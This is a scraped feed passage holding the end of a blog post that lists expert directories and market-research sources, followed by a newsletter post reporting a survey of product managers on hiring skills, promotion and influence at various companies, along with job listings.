<a href="https://news.ycombinator.com/user?id=zoba">zoba</a>,
<a href="https://news.ycombinator.com/user?id=ryandrake">ryandrake</a>,
a guy I canâ€™t name who offers â€œpersonal assistant concierge services for high-net-worth families,â€
and <a href="https://acesounderglass.com/">Elizabeth Van Nostrand</a>
for some of the ideas above.</em></p>
<hr>



<table>
<thead>
  <tr>
    <th>Name</th>
    <th>Type</th>
    <th>Comments</th>
    <th>Target Audience</th>
    <th>URL</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>Expertise Finder</td>
    <td>Academics to comment on many subjects</td>
    <td></td>
    <td>Journalists</td>
    <td><a href="https://expertisefinder.com/">link</a></td>
  </tr>
  <tr>
    <td>WomenÃ¢â‚¬â„¢s Media Center SheSource</td>
    <td>Women only, focuses on current events and politics</td>
    <td></td>
    <td>Journalists</td>
    <td><a href="https://www.womensmediacenter.com/shesource/">link</a></td>
  </tr>
  <tr>
    <td>National Association of Personal Financial Advisors</td>
    <td>Financial only</td>
    <td>Seems like a low bar to entry</td>
    <td>Journalists</td>
    <td><a href="https://www.napfa.org/newsroom">link</a></td>
  </tr>
  <tr>
    <td>ProfNet</td>
    <td>Wide range of experts</td>
    <td>Owned by PR firm, presumably works for experts more than you</td>
    <td>Journalists</td>
    <td><a href="https://profnet.prnewswire.com/ProfNetHome/What-is-Profnet.aspx">link</a></td>
  </tr>
  <tr>
    <td>Coursera Expert Network</td>
    <td>Academics from top schools only</td>
    <td>Presumably biased towards people who have made Coursera courses</td>
    <td>Journalists</td>
    <td><a href="https://experts.coursera.org/">link</a></td>
  </tr>
  <tr>
    <td>ExpertFile</td>
    <td>Curated experts from universities, institutions, think tanks, associations, companies and other sources</td>
    <td></td>
    <td>Journalists</td>
    <td><a href="https://expertfile.com/">link</a></td>
  </tr>
  <tr>
    <td>GURU</td>
    <td>Aimed mostly at professional expertise (Sales, Marketing, Eng, etc.)</td>
    <td></td>
    <td>Businesses</td>
    <td><a href="https://www.guru.com/">link</a></td>
  </tr>
  <tr>
    <td>Amber Biology</td>
    <td>Biologists only</td>
    <td></td>
    <td>Science projects?</td>
    <td><a href="https://www.amberbiology.com/">link</a></td>
  </tr>
  <tr>
    <td>Help a Reporter Out (HARO)</td>
    <td></td>
    <td>Requires affiliation with a highly ranked website</td>
    <td>Journalists</td>
    <td><a href="https://www.helpareporter.com/">link</a></td>
  </tr>
  <tr>
    <td>Self Improvement Experts Directory</td>
    <td></td>
    <td></td>
    <td>Individuals</td>
    <td><a href="https://www.selfgrowth.com/experts.html">link</a></td>
  </tr>
  <tr>
    <td>JurisPro</td>
    <td>Expert witnesses</td>
    <td></td>
    <td>Lawyers</td>
    <td><a href="https://www.jurispro.com/">link</a></td>
  </tr>
  <tr>
    <td>ForensisGroup</td>
    <td>Expert witnesses</td>
    <td></td>
    <td>Lawyers</td>
    <td><a href="https://www.forensisgroup.com/">link</a></td>
  </tr>
  <tr>
    <td>Expert Institute</td>
    <td>Expert witnesses</td>
    <td></td>
    <td>Lawyers</td>
    <td><a href="https://www.expertinstitute.com/">link</a></td>
  </tr>
</tbody>
</table>                                                                                                                                   


<ul>
<li>Top choices:
<ul>
<li><a href="https://www.ibisworld.com/">IBIS</a></li>
<li><a href="https://profound.com/">Profound</a></li>
<li><a href="https://www.eifl.net/e-resources/research-monitor">Research Monitor</a></li>
<li><a href="https://www.euromonitor.com/store">EuroMonitor</a></li>
</ul>
</li>
<li><a href="https://www.insideview.com/">Inside View</a></li>
<li><a href="https://www.census.gov/">US Census Data</a></li>
<li><a href="https://www.sba.gov/offices/headquarters/oee/resources/2836">SBAÃ¢â‚¬â„¢s Office of Entrepreneurship Education Resources</a></li>
<li><a href="http://www.pewresearch.org/">Pew Research Center</a></li>
<li><a href="https://www.statista.com/">Statista</a></li>
<li><a href="https://www.marketresearch.com/">marketresearch.com</a></li>
<li><a href="https://www.plunkettresearch.com/how-to-buy/">Plunkett Research</a></li>
<li><a href="https://market-intelligence.com.au/">The Market Intelligence Co.</a></li>
<li><a href="https://www.jinfo.com/">Jinfo</a></li>
<li><a href="https://www.idc.com/">IDC</a></li>
<li><a href="https://www.gartner.com/en">Gartner</a></li>
<li><a href="https://pitchbook.com/">Pitchbook</a></li>
<li><a href="https://www.crunchbase.com/">Crunchbase</a></li>
</ul>
</article>

        </div></div>]]>
            </description>
            <link>https://milan.cvitkovic.net/writing/things_youre_allowed_to_do/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25513713</guid>
            <pubDate>Wed, 23 Dec 2020 02:20:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A comprehensive survey of Product Management]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25513614">thread link</a>) | @regera
<br/>
December 22, 2020 | https://www.lennyrachitsky.com/p/product-management-survey | <a href="https://web.archive.org/web/*/https://www.lennyrachitsky.com/p/product-management-survey">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>ğŸ‘‹ Hello, Iâ€™m&nbsp;<a href="https://twitter.com/lennysan">Lenny</a>&nbsp;and welcome to a âœ¨&nbsp;<strong>once-a-month-free-edition&nbsp;</strong>âœ¨ of my newsletter. Each week I humbly tackle reader questions about product, growth, working with humans, and anything else thatâ€™s stressing you out at the office.</em></p><p><em>If youâ€™re not a paid subscriber, hereâ€™s what you missed this month:</em></p><ol><li><p><em><a href="https://www.lennyrachitsky.com/p/creating-buzz-at-launch-preview">Ten ways to generate buzz for your product</a></em></p></li><li><p><em><a href="https://www.lennyrachitsky.com/p/seo-experimentation">How to run SEO experiments</a></em></p></li><li><p><em><a href="https://www.lennyrachitsky.com/p/not-running-an-experiment">When NOT to run an experiment</a></em></p></li></ol><blockquote><h2>Q: What is the product manager role like at different companies?</h2></blockquote><p>What skills do companies look for in a PM? What do PMs need to get right to get promoted? How much influence do PMs have at different companies? Thereâ€™s surprisingly little information out there about the differences in the PM role across the industry.</p><p>Today, Iâ€™m sharing findings from a survey Iâ€™ve been running over the past month, with nearly 1,000 responses from over 600 companies. Below, youâ€™ll find:</p><ol><li><p>Which skills matter most when hiring PMs</p></li><li><p>What PMs have to get most right to get promoted</p></li><li><p>How much influence PMs have</p></li><li><p>Which companies prioritize Heart vs. Head vs. Hands</p></li><li><p>Takeaways, and links to dig deeper</p></li></ol><p><em>A big thank you to <a href="https://productmanagerhq.com/">PMHQ</a>, <a href="https://twitter.com/sriramk">Sriram Krishnan</a>, <a href="https://twitter.com/hnshah">Hiten Shah</a>, <a href="https://twitter.com/joshelman">Josh Elman</a>, <a href="https://twitter.com/ianmcall">Ian McAllister</a> for helping amplify this survey to get more responses, and to <a href="https://www.linkedin.com/in/talsraviv/?originalSubdomain=il">Tal Raviv</a>, <a href="https://www.linkedin.com/in/manikg">Manik Gupta</a>, <a href="https://www.linkedin.com/in/helensims">Helen Sims</a>, <a href="https://www.linkedin.com/in/ajfrank/">AJ Frank</a>, <a href="https://www.linkedin.com/in/matthias-wagner-5220b047/">Matthias Wagner</a>, <a href="https://www.linkedin.com/in/karaskrip/">Kara Skrip</a>, <a href="https://www.linkedin.com/in/seanplynch/">Sean Lynch</a>, <a href="https://www.linkedin.com/in/petesauer/">Peter Sauer</a>, and <a href="https://www.linkedin.com/in/kiyanibamba/">Kiyani Bamba</a> for feedback on the survey and post.</em></p><p><strong>A few quick disclaimers:</strong></p><ol><li><p>Iâ€™m no survey expert. I may have gotten something wrong. Please forgive me if so, and please <a href="https://forms.gle/HKtkAXRhWSRqVNqf8">give me feedback</a>.</p></li><li><p>85% of the responders were product managers (as planned), so assume bias from that perspective.</p></li><li><p>When I mention specific companies below, I made sure to have at least two data points from that company.</p></li></ol><p>Letâ€™s dive in!</p><h2>Who took the survey</h2><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=723289895"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F248d2fc3-c0e9-4264-92d8-2e0520a6e447_2000x1266.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/248d2fc3-c0e9-4264-92d8-2e0520a6e447_2000x1266.png&quot;,&quot;height&quot;:922,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1309072,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=723289895&quot;}" alt=""></a></figure></div><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1938272815"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F094b4bba-2f46-4c73-8adf-3e00675a1ece_2000x1749.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/094b4bba-2f46-4c73-8adf-3e00675a1ece_2000x1749.png&quot;,&quot;height&quot;:1273,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:178028,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1938272815&quot;}" alt=""></a></figure></div><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1938272815"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8fa457b9-db26-438d-a429-88b20e801f53_2000x1392.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/8fa457b9-db26-438d-a429-88b20e801f53_2000x1392.png&quot;,&quot;height&quot;:1013,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:59220,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1938272815&quot;}" alt=""></a></figure></div><h2>Being a Product Manager</h2><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1402367635"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fcf1e593c-cf7e-4ec4-9dc9-b0a4988e92a2_2000x1433.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/cf1e593c-cf7e-4ec4-9dc9-b0a4988e92a2_2000x1433.png&quot;,&quot;height&quot;:1043,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:114802,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1402367635&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p><strong>Most frequently valued</strong>: Communication, execution, product sense</p></li><li><p><strong>Least frequently valued</strong>: Design/UX, empathy, raw intelligence</p></li></ol></blockquote><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=0"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa540c078-53e6-4d0e-b893-b097c28256be_2000x2042.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a540c078-53e6-4d0e-b893-b097c28256be_2000x2042.png&quot;,&quot;height&quot;:1487,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:216224,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=0&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p>Companies who spike on Communication: <strong>HubSpot, Salesforce</strong></p></li><li><p>Companies who spike on Execution: <strong>Salesforce, Tesla, VMware</strong></p></li><li><p>Companies who spike on Product sense: <strong>Asana, Flipkart, Intercom, Netflix, ServiceNow, WhatsApp</strong></p></li><li><p>Companies who spike on Strategic thinking: <strong>Coinbase, Stripe, Zillow</strong></p></li><li><p>Companies who spike on Collaboration: <strong>Atlassian, Box, ServiceNow, Spotify, Twitter</strong></p></li><li><p>Companies who spike on Data acumen: <strong>Quora, Reddit, Zynga</strong></p></li><li><p>Companies who spike on Technical background: <strong>Oracle, Stripe</strong></p></li><li><p>Companies who spike on Raw intelligence: <strong>Coinbase, Robinhood</strong></p></li><li><p>Companies who spike on Empathy: <strong>HubSpot, Intercom</strong></p></li><li><p>Companies who spike on Design/UX: <strong>WhatsApp</strong></p></li></ol></blockquote><h2>Getting promoted</h2><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1717122536"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F74ce70b3-5879-4081-93e0-3f210c1f8332_1996x1290.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/74ce70b3-5879-4081-93e0-3f210c1f8332_1996x1290.png&quot;,&quot;height&quot;:941,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:94279,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1717122536&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p>Showing significant impact on the business â€” by far the most common thing to get right</p></li><li><p>Unlike the mini-CEO label PMs often get, in reality they must keep their external stakeholders onboard to be successful</p></li><li><p>Keeping their team and manager happy â€” less of a priority at most companies, but as youâ€™ll see below, very important at some</p></li></ol></blockquote><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=336985443"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F80eb5c80-9e83-4195-bd3a-2376381d383d_2002x2682.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/80eb5c80-9e83-4195-bd3a-2376381d383d_2002x2682.png&quot;,&quot;height&quot;:1951,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:280301,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=336985443&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p>Companies who prioritize Showing significant business impact: <strong>Atlassian, Capital One, Coinbase, Expedia, HubSpot, Netflix, Square, Wayfair, Yelp, YouTube, Zillow</strong></p></li><li><p>Companies who prioritize Keeping stakeholders onboard: <strong>Atlassian, Booking, IBM, VMware, Wayfair, Zillow</strong></p></li><li><p>Companies who prioritize Hitting goals: <strong>Airbnb, Reddit, Yelp, Zynga&nbsp;</strong></p></li><li><p>Companies who prioritize Shipping great product: <strong>Adobe, Hubspot, Intercom, Robinhood, Stripe, WhatsApp</strong></p></li><li><p>Companies who prioritize Making their manager happy: <strong>Apple, IBM, Oracle </strong></p></li><li><p>Companies who prioritize Keeping their team happy: <strong>Intercom, Quora, Visa</strong></p></li></ol></blockquote><h2>Influence</h2><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1081679648"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff8c5c2b1-1bec-4c47-97d7-f5823ac25ca9_2000x1363.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/f8c5c2b1-1bec-4c47-97d7-f5823ac25ca9_2000x1363.png&quot;,&quot;height&quot;:992,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:89529,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1081679648&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p>According to responders (mostly PMs), PMs have more influence than other functions at over 80% of companies</p></li><li><p>Similarly, PMs have â€œa lot moreâ€ influence at ~50% of companies</p></li><li><p>Almost no companies have PMs with a lot <em>less</em> influence than other functions</p></li></ol></blockquote><p><em>Looking at this same data but excluding responses from product managers (e.g. only looking at responses from engineers, designers, CEOs, etc.), the story shifts a bit:</em></p><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1081679648"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F4c3c9c1b-6f38-462f-bc79-484c05d3c76d_2000x1408.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/4c3c9c1b-6f38-462f-bc79-484c05d3c76d_2000x1408.png&quot;,&quot;height&quot;:1025,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:93441,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1081679648&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p>From this perspective, we find that PMs have more influence than other functions at only 70% of companies (vs. 80% above). Clearly, PMs believe they have more influence than their teammates think they do.</p></li><li><p>However, most of the variance comes from the number of responders who believe PMs run the show â€” ~13% when looking at all responses, but only ~6% when PM responses are excluded.</p></li><li><p>In both cases, roughly the same percentage of companies have PMs with slightly more, or a lot more, influence (~65%).</p></li></ol></blockquote><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=259998754"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fe4a2909a-426a-459c-8bc0-b9151cc9a25a_2002x1035.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/e4a2909a-426a-459c-8bc0-b9151cc9a25a_2002x1035.png&quot;,&quot;height&quot;:753,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:176142,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=259998754&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p><strong>The spectrum varies widely</strong>: from Zynga where PMs run the show, to Apple where PMs have the least influence</p></li><li><p><strong>Noteworthy companies where PMs have a lot more influence</strong>: YouTube, LinkedIn, Twitter, Uber, Robinhood, Lyft, Coinbase, Asana, Airbnb</p></li><li><p><strong>Noteworthy companies where PMs have relatively less influence</strong>: Apple, Oracle, Stripe, Tesla</p></li></ol></blockquote><h2>Heart vs. Hands vs. Head</h2><p>It's often said that companies are defined by how they index on Heart (e.g. empathy, culture) vs. Hands (e.g. execution) vs. Head (e.g. intelligence). When describing PMs at your company, how would you stack rank the importance of Heart, Hands, and Head?</p><div><figure><a target="_blank" href="https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1900512953"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F5d347488-07b9-4504-95bb-43f2dcc8b720_2000x1103.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/5d347488-07b9-4504-95bb-43f2dcc8b720_2000x1103.png&quot;,&quot;height&quot;:803,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:144688,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://docs.google.com/spreadsheets/d/1hJ3P9S-ArOSUAWM5YcyEo04NzzZn-i-8EAb_Rm9VDDA/edit#gid=1900512953&quot;}" alt=""></a></figure></div><blockquote><p><strong>Takeaways</strong>:</p><ol><li><p>Companies who spike on <strong>Heart</strong>: Asana, Spotify, WhatsApp</p></li><li><p>Companies who spike on <strong>Hands</strong>: Flipkart, Okta, PayPal, Quora, Tesla, Wayfair, Yelp </p></li><li><p>Companies who spike on <strong>Head</strong>: Coinbase, Uber, YouTube, Zynga</p></li></ol></blockquote><h2>Whatâ€™s next</h2><p>This is the first time Iâ€™ve conducted a survey like this. Depending on how itâ€™s received, I hope to run it again sometime in the future. If you have any feedback on the results, the analysis, or the way it was run, Iâ€™d love to hear it. <a href="https://forms.gle/HKtkAXRhWSRqVNqf8">Please leave your feedback here</a>.</p><p>And lastly, if you see any other interesting takeaways when looking at this data, please leave a comment ğŸ‘‡</p><p data-attrs="{&quot;url&quot;:&quot;https://www.lennyrachitsky.com/p/product-management-survey/comments&quot;,&quot;text&quot;:&quot;Leave a comment&quot;,&quot;class&quot;:null}"><a href="https://www.lennyrachitsky.com/p/product-management-survey/comments"><span>Leave a comment</span></a></p><p>See you next week!</p><h2><strong>ğŸ”¥&nbsp;Job opportunities</strong></h2><p><strong>âœ¨ </strong>Sponsored job of the week: <strong><a href="https://boards.greenhouse.io/userleap/jobs/4279026003">Product Manager at UserLeap</a>&nbsp;âœ¨</strong></p><ol><li><p><strong>Product</strong>:&nbsp;<a href="https://boards.greenhouse.io/cerebral/jobs/4124465003">Cerebral</a>,&nbsp;<a href="https://jobs.lever.co/descript-2/08f9b563-c3e6-49a4-be07-82fafc1868af">Descript</a>,&nbsp;<a href="https://angel.co/company/kudo-meeting/jobs/913705-product-manager">KUDO</a>,&nbsp;<a href="https://jobs.lever.co/hipcamp/d04821c3-fb9a-4d3f-9a7a-1b75deacc09f">Hipcamp</a>,&nbsp;<a href="https://apply.workable.com/prenda/j/63270A44BB/">Prenda</a></p></li><li><p><strong>Growth</strong>:&nbsp;<a href="https://www.basisone.com/careers/growth-strategy-lead">BasisOne</a>,&nbsp;<a href="https://boards.greenhouse.io/coda/jobs/4794809002">Coda</a>,&nbsp;<a href="http://levels.link/growth">Levels</a>,&nbsp;<a href="https://apply.workable.com/prenda/j/AC98C5FDFB/">Prenda</a></p></li><li><p><strong>Design</strong>:&nbsp;<a href="https://jobs.ashbyhq.com/ashby/145ff46b-1441-4773-bcd3-c8c90baa598a">Ashby</a>,&nbsp;<a href="https://www.cascade.io/jobs/analytical-product-designer">Cascade</a>,&nbsp;<a href="https://docs.google.com/document/d/1_aHEl08ahc6NjOhwmi9GQlNv8CvlOwf8hL-FyCrmAes/edit">Office Hours</a>,&nbsp;<a href="https://www.notion.so/A-Product-Designer-baa24543701f472bb291d4429812064a">Runway</a>,&nbsp;<a href="https://jobs.lever.co/stytch/675e6a11-5a33-41bc-9315-5a3ca141d444">Stytch</a>,&nbsp;<a href="https://www.notion.so/Designer-Watershed-7cb7bf8bd750432399d36e83e4e32391">Watershed</a></p></li><li><p><strong>Engineering manager</strong>:&nbsp;<a href="https://boards.greenhouse.io/cerebral/jobs/4076598003">Cerebral</a></p></li><li><p><strong>Frontend engineer</strong>:&nbsp;<a href="https://www.notion.so/levelshealth/Join-Levels-Remote-Developer-58454f0db7e3466692f7b75db6237ddf">Levels</a>,&nbsp;<a href="https://www.notion.so/Front-end-Developer-929e1933b9b4432a851043adbb7bff04">Practice</a>, <a href="https://www.linkedin.com/jobs/view/2323962506/">Tome</a></p></li><li><p><strong>Backend engineer</strong>:&nbsp;<a href="https://boards.greenhouse.io/coda/jobs/4489268002">Coda</a>,&nbsp;<a href="https://sourcetable.com/jobs#backend-engineer">Sourcetable</a>,&nbsp;<a href="https://transformdata.io/careers/">Transform</a></p></li><li><p><strong>Fullstack engineer</strong>: <a href="https://www.cascade.io/jobs/full-stack-product-engineer">Cascade</a>,&nbsp;<a href="https://www.notion.so/Software-Developer-e7cad269968e4d5aaeb1f6da9e282626">Centered</a>,&nbsp;<a href="https://boards.greenhouse.io/cerebral/jobs/4188468003">Cerebral</a>,&nbsp;<a href="https://icebreaker.video/product-engineer">Icebreaker</a>,&nbsp;<a href="https://www.notion.so/askiggy/Full-Stack-Engineer-IggyAPI-5a8c1825028e421b9587538718f370b4">Iggy</a>,&nbsp;<a href="https://www.notion.so/Senior-Software-Engineer-Full-stack-web-San-Francisco-CA-3a0af35008104def82836a5b9a5a88e1">Primer</a>,&nbsp;<a href="https://www.notion.so/A-Product-first-Full-stack-Engineer-5e056689b68048aeb1ccfea6ac73eb9e">Runway</a>,&nbsp;<a href="https://jobs.lever.co/snackpass/7c3bb72b-70d3-45ca-9dea-eea57ed5333d">Snackpass</a></p></li><li><p><strong>iOS engineer</strong>:&nbsp;<a href="https://www.notion.so/Lead-iOS-Developer-ba18577b6ba44ad68e45b8e7a957353c">Pairplay</a>,&nbsp;<a href="https://www.notion.so/Senior-Software-Engineer-iOS-San-Francisco-CA-87f0fd3ee3dc4c3f8d0419c07fcdd434">Primer</a>,&nbsp;<a href="https://jobs.lever.co/stytch/d3bf3860-4aaa-4a23-8e28-dad20957be44">Stytch</a>,&nbsp;<a href="https://www.notion.so/Mobile-Engineer-Vori-c5ceccd966a04c8aa9e970f0355ca13c">Vori</a></p></li></ol><h4><strong>How would you rate this week's newsletter? ğŸ¤”</strong></h4><p><a href="https://t.sidekickopen82.com/s1t/c/5/f18dQhb0S7kF8cV_VXW1CdjwB59hl3kW7_k2847sD3qkVNxJHk1CX2ZcW2bzNJl8lkfc1101?te=W3R5hFj4cm2zwW4cQKtC3KcLnYW4hLZp03ZVbTxW1JB0ML1--tKxW20ZTw51-YpBFW1W_jBk1ZmvHBW21j9tt1-_j_TW1Vnkcj1V3fMvw1V21pC4Hp2&amp;si=7000000001348012&amp;pi=6174bab6-7009-4402-a497-3d6f867fbea1">Great</a>&nbsp;â€¢&nbsp;<a 